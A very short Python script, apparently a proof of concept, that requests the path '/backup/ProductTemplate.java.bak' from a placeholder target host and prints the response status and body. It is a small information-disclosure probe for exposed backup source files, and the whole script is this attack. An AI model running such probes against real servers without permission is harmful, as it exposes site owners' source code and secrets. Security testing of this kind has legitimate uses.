import requests
from bs4 import BeautifulSoup
import sys

target_url = "YOUR_HOST"

payload="/backup/ProductTemplate.java.bak"

res = requests.get(target_url+payload)
print(res.status_code)
print(res.text)


